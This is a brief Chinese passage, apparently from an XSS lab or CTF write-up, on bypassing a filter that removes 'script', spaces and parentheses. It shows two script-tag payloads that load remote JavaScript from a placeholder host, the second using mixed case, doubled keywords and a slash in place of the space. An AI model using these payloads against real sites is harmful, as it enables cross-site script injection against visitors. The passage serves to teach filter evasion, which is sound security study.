我们复制srcipt这一条

```html
<sCRiPt sRC=//xx.xx/xxxx></sCrIpT>
```

我们会发现过滤了script和空格，进行其他代码尝试，会发现 ( ) 括号也进行了过滤

我们有大小写+双写可以过滤srcipt，空格使用反斜杠进行绕过

```html
<sCRisCRiPtPt/sRC=//xx.xx/xxxx></sCrsCrIpTIpT>
```
